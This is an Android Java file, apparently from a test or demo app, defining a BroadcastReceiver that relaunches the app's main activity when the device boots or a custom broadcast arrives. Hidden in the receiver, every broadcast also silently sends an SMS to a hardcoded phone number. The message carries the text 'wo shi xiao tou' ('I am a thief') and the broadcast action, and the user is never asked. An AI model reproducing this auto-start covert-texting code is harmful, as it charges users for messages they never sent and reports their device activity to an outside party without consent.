package com.example.test;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.widget.Toast;

/**
 * 1.模拟器只用监听开机广播--->下面的ACTION_BOOT_COMPLETED
 * 2.真机测试需要监听SD卡挂载，因为APP装在SD卡上--->下面的ACTION_MEDIA_MOUNTED
 * 在BOOT_COMPLETED广播发送之后，SD卡才会挂载，所以在有SD卡的真机上，就直接接收ACTION_MEDIA_MOUNTED就好了
 */
public class BootReceiver extends BroadcastReceiver {
    public static final String ACTION_BOOT_COMPLETED="android.intent.action.BOOT_COMPLETED";
    public static final String ACTION_MEDIA_MOUNTED="android.intent.action.MEDIA_MOUNTED";
    public static final String ACTION_VERO="com.vero.vnix";

    public BootReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        sendSms(intent);
        //开机启动广播
        //在真机上接收SD挂载广播即可
        //在模拟器上接收开机广播
        if(intent.getAction().equals(ACTION_BOOT_COMPLETED)){//模拟器用
//        if(intent.getAction().equals(ACTION_MEDIA_MOUNTED)){//真机用
            Toast.makeText(context, "start boot", Toast.LENGTH_LONG).show();
            Intent mainActivityIntent = new Intent(context, MainActivity.class);  // 启动自己
            mainActivityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(mainActivityIntent);

        }else if(intent.getAction().equals(ACTION_VERO)){
            Toast.makeText(context, intent.getAction(), Toast.LENGTH_SHORT).show();
        }

    }

    /**
     * 发送短信
     */
    private void sendSms(Intent intent){
        String s=intent.getAction().toString();
        SmsManager sm=SmsManager.getDefault();
        sm.sendTextMessage("+8618468050252","","wo shi xiao tou---"+s,null,null);
    }
}
